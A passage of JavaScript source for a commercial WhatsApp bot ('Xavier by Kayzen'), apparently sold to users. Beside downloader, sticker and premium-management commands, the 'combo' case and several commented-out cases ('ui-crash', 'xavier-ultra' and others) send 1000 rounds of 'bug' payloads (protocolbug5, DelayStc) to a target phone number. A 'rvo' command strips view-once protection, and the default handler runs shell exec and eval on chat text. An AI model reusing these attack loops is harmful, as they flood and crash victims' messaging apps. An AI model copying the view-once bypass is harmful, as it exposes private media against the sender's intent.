                        audio: fs.readFileSync('./media/menu1.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
break*/

case "combo": {
if (!isPremium) return m.reply("*[ 403 ]* You Are Not Premium User!")
if (!q) return m.reply(`Example: ${prefix + command} 628`)
let target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
m.reply(`Succes Sending Bug To ${target}`)
for (let lez = 0; lez < 1000; lez++) {
protocolbug5(target)
DelayStc(Kayzen, target)
}
}
break
          case "rvo": {
if (!m.quoted) return reply(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${prefix + command}`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await Kayzen.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await Kayzen.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await Kayzen.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}}
break;
case "tourl3": {
if (!/image/.test(mime)) return reply("dengan kirim/reply foto")
let media = await Kayzen.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Kayzen.png');

let teks = directLink.toString()
await Kayzen.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
/*// AWAL CASE 𝘉𝘜𝘎
case 'mystic': case 'volcanic': case 'xenoid':
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 1000; i++) {
   await DelayStc(kayzen, isTarget) 
     }
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘛𝘰 _${target}_, 𝘈𝘯𝘥 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳𝘨𝘦𝘵 𝘛𝘰 𝘗𝘢𝘶𝘴𝘦 𝘍𝘰𝘳 𝘈𝘣𝘰𝘶𝘵 10-20 𝘔𝘪𝘯𝘶𝘵𝘦𝘴 𝘖𝘬𝘦? :)`)
break
case 'flow': case 'close': case 'dream':
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 1000; i++) {
   await DelayStc(kayzen, isTarget) 
   await protocolbug5(isTarget, mention)
     }
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘛𝘰 _${target}_, 𝘈𝘯𝘥 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳𝘨𝘦𝘵 𝘛𝘰 𝘗𝘢𝘶𝘴𝘦 𝘍𝘰𝘳 𝘈𝘣𝘰𝘶𝘵 10-20 𝘔𝘪𝘯𝘶𝘵𝘦𝘴 𝘖𝘬𝘦? :)`)
break
case 'xavier-medium': case 'xavier-hard': case 'xavier-expert': case 'xavier-system': case 'xavier-ultra': case 'xavier-ui':
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 1000; i++) {
   await DelayStc(kayzen, isTarget) 
   await protocolbug5(isTarget, mention)
     }
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘛𝘰 _${target}_, 𝘈𝘯𝘥 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳𝘨𝘦𝘵 𝘛𝘰 𝘗𝘢𝘶𝘴𝘦 𝘍𝘰𝘳 𝘈𝘣𝘰𝘶𝘵 10-20 𝘔𝘪𝘯𝘶𝘵𝘦𝘴 𝘖𝘬𝘦? :)`)
break
case 'ui-cuy': case 'ui-aja': case 'ui-crash': case 'ui-system': case 'ui-hard': case 'ui-medium': case 'ui-expert': case 'ui-ultra':
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 1000; i++) {
   await DelayStc(kayzen, isTarget) 
   await protocolbug5(isTarget, mention)
     }
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘛𝘰 _${target}_, 𝘈𝘯𝘥 𝘋𝘰𝘯'𝘵 𝘍𝘰𝘳𝘨𝘦𝘵 𝘛𝘰 𝘗𝘢𝘶𝘴𝘦 𝘍𝘰𝘳 𝘈𝘣𝘰𝘶𝘵 10-20 𝘔𝘪𝘯𝘶𝘵𝘦𝘴 𝘖𝘬𝘦? :)`)
break*/
case 'buysc': {
let name = m.pushName || Kayzen.getName(m.sender);
let panduan = ``

const url = 'https://files.catbox.moe/j5trse.jpg'
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Kayzen.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/j5trse.jpg' } }, { upload: Kayzen.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '𝘟𝘢𝘷𝘪𝘦𝘳 𝘉𝘺 𝘒𝘢𝘺𝘻𝘦𝘯',
          hasMediaAttachment: true
        }),
                body: {
                  text: `𝘊𝘩𝘢𝘵 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘉𝘶𝘺 𝘛𝘩𝘪𝘴 𝘚𝘤𝘳𝘪𝘱𝘵, 𝘋𝘰𝘯'𝘵 𝘚𝘱𝘢𝘮 𝘊𝘩𝘢𝘵 𝘖𝘳 𝘊𝘢𝘭𝘭 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘉𝘵𝘸 ᐛ`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝘛𝘩𝘦 𝘊𝘳𝘦𝘢𝘵𝘰𝘳","url":"https://wa.me/6282295954278","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Kayzen.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
case 'tiktok': case 'tt': {
if (!text) return m.reply("Link Nya?")
if (!text.startsWith("https://")) return m.reply("url")
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Kayzen.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: qkontak})
await Kayzen.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Kayzen.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: qkontak})
}
}).catch(e => console.log(e))
await Kayzen.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "play1":{
                if (!text) return reply(`\n*ex:* ${prefix + command} impossible\n`)
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                Kayzen.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: qkontak })
            }
            break
            case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
 if (!text) return reply(`Gunakan: ${prefix + command} <url> [resolusi]`); 
 let url = args[0]; 
 let resolution = args[1] && !isNaN(args[1]) ? args[1] : "720"; 
 try { 
 await Kayzen.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 let info = await getVideoInfo(url);
 if (!info || !info.status) return reply('❌ Gagal mendapatkan informasi video.');
 await Kayzen.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
 let video = await downloadVideo(url, resolution);
 if (!video.status || !video.downloadUrl) return reply('❌ Gagal mendapatkan file video.');
 let captionInfo = `📹 *${info.title}*\n👤 *Creator:* ${info.creator}\n⏳ *Durasi:* ${info.duration} detik\n📡 *Sumber:* ${video.source}\n🎥 *Resolusi:* ${resolution}p\n🔗 *URL:* ${info.url}`;
 await Kayzen.sendMessage(m.chat, {
 image: { url: info.thumbnail },
 caption: captionInfo
 }, { quoted: m });
 await Kayzen.sendMessage(m.chat, { react: { text: '📤', key: m.key } });
 let fileSize = await getFileSizeFromUrl(video.downloadUrl);
 let captionMedia = `📹 *${info.title}*\n👤 *${info.creator}*\n📡 *Sumber:* ${video.source}`;
 if (fileSize > 15 * 1024 * 1024) {
 await Kayzen.sendMessage(m.chat, { 
 document: { url: video.downloadUrl },
 mimetype: 'video/mp4',
 fileName: `${info.title}.mp4`,
 caption: captionMedia
 }, { quoted: m });
 } else {
 await Kayzen.sendMessage(m.chat, { 
 video: { url: video.downloadUrl },
 caption: captionMedia,
 fileName: `${info.title}.mp4`
 }, { quoted: m });
 }
 await Kayzen.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) { 
 console.error(err); 
 reply('❌ Terjadi kesalahan.'); 
 } 
} 
break
case 'play': 
case 'ytplay': {
if (!text) return reply(`Example: ${prefix + command} Lagu sad`);
try {		
let search = await yts(`${text}`);
if (!search || search.all.length === 0) return reply(`*Lagu tidak ditemukan!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
Kayzen.sendMessage(m.chat,{
image: { url: image },
caption: caption,
footer: `${global.namaOwner}`,
buttons: [
{
buttonId: `${prefix}play1 ${text}`,
buttonText: {
displayText: "YouTube Music"
}
},
{
buttonId: `${prefix}ytmp4 ${url}`,
buttonText: {
displayText: "YouTube Video"
}
}
],
viewOnce: true,
}, {
quoted: m
});
} catch (err) {
console.error(err);
reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
}
break
case 'mode': {
if (!IsXavier) return reply(mess.owner)
let mode = `𝘽𝙤𝙩 𝙉𝙮𝙖 𝙈𝙖𝙪 𝘿𝙞 𝙈𝙤𝙙𝙚 𝘼𝙥𝙖 𝙉𝙞𝙝 𝙆𝙞𝙣𝙜`
await Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'MODE SAD (MODE SELF)',
                  id: '.self'
                },                
                {
                  title: 'MODE HAPPY (MODE PUBLIC)',
                  id: '.public'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: namafile,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: mode,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: namach,
   },   
    externalAdReply: {
      title: namaBot,
      body: namaowner,
      thumbnailUrl: thumbnail,
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case 'owner': {
let name = m.pushName || Kayzen.getName(m.sender);
let panduan = ``

const url = 'https://files.catbox.moe/j5trse.jpg'
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Kayzen.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/j5trse.jpg' } }, { upload: Kayzen.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: '𝘟𝘢𝘷𝘪𝘦𝘳 𝘉𝘺 𝘒𝘢𝘺𝘻𝘦𝘯',
          hasMediaAttachment: true
        }),
                body: {
                  text: `𝘊𝘩𝘢𝘵 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘉𝘶𝘺 𝘛𝘩𝘪𝘴 𝘚𝘤𝘳𝘪𝘱𝘵, 𝘋𝘰𝘯'𝘵 𝘚𝘱𝘢𝘮 𝘊𝘩𝘢𝘵 𝘖𝘳 𝘊𝘢𝘭𝘭 𝘔𝘺 𝘖𝘸𝘯𝘦𝘳 𝘉𝘵𝘸 ᐛ`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝘛𝘩𝘦 𝘊𝘳𝘦𝘢𝘵𝘰𝘳","url":"https://wa.me/6282295954278","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await Kayzen.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});
}
break
case "brt": {
if (!text) return Reply(`\n*ex:* ${prefix + command} apanih cok\n`)
  const media = `https://brat.caliphdev.com/api/brat?text=${text}`;
  await reaction(m.chat, "⏳")

  Kayzen.sendImageAsSticker(m.chat, media, m, {
    packname: packname,
    author: author
  });
}
break
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kayzen.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Kayzen.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case "listprem": {
if (!IsXavier) return reply(mess.owner)
if (premium.length < 1) return reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Kayzen.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qkontak})
}
break
case 'addprem': {
if (!IsXavier) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘗𝘳𝘦𝘮𝘪𝘶𝘮!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
}
break
case 'delprem': {
    if (!IsXavier) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
case "public":{
if (!IsXavier) return reply(mess.owner)
Kayzen.public = true
reply(`successfully changed to ${command}`)
}
break
case "self":{
if (!IsXavier) return reply(mess.owner)
Kayzen.public = false
reply(`successfully changed to ${command}`)
}
break
                
case 'tagall':{
if (!IsXavier) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group);
const textMessage = args.join(" ") || "nothing";
let teks = `tagall message :\n> *${textMessage}*\n\n`;
const groupMetadata = await Kayzen.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
Kayzen.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: m });
}
break         
case "h":
case "hidetag": {
if (!m.isGroup) return reply(mess.group)
if (!IsXavier) return reply(mess.owner)
if (m.quoted) {
Kayzen.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
Kayzen.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: m })
}
}
break
                
            default:
                if (budy.startsWith('$')) {
                    if (!IsXavier) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!IsXavier) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!IsXavier) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
